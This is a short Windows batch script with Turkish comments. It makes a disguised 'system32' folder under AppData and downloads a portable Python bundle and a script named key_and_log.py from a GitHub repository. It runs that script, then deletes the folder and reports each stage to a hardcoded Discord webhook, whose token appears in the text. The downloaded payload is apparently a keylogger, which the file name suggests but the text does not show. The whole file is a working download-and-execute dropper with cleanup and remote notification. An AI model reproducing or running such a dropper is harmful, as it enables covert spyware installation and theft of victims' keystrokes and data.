@echo off

:: Webhook URL
set WEBHOOK_URL=https://discord.com/api/webhooks/1246739900783399022/YJ0TZ3sqjSaR71iVNAhDIdw1W7Fi6g_hI0MyrrQSOEaP7ZQ0CTxayfFbmYwZqQMH-E7q

:: Webhook message
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"CMD script started\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"

:: %appdata% dizinine git ve system32 klasörü oluştur
cd /d "%appdata%"
if not exist system32 mkdir system32
cd system32

:: Dosyaları indir
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/Special_Script/raw/main/scripts/key_and_log/python.zip' -OutFile 'Python.zip'"

:: py klasörü oluştur ve Python.zip'i çıkar
mkdir py
powershell -Command "Expand-Archive -Path 'Python.zip' -DestinationPath 'py' -Force"

:: Python.zip dosyasını sil
del Python.zip

:: scripts klasörü oluştur ve key_and_log.py dosyasını indir
mkdir scripts
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/nizhenets/Special_script/raw/main/scripts/key_and_log/key_and_log.py' -OutFile 'scripts\\key_and_log.py'"

:: Python scriptini çalıştır
"%appdata%\system32\py\python.exe" "%appdata%\system32\scripts\key_and_log.py"

:: system32 klasörünü ve içeriğini sil
cd /d "%appdata%"
rmdir /s /q system32

:: Webhook message
powershell -Command "$url='%WEBHOOK_URL%'; $message='{\"content\":\"system32 klasörü ve içeriği silindi.\"}'; Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json' -Body $message"
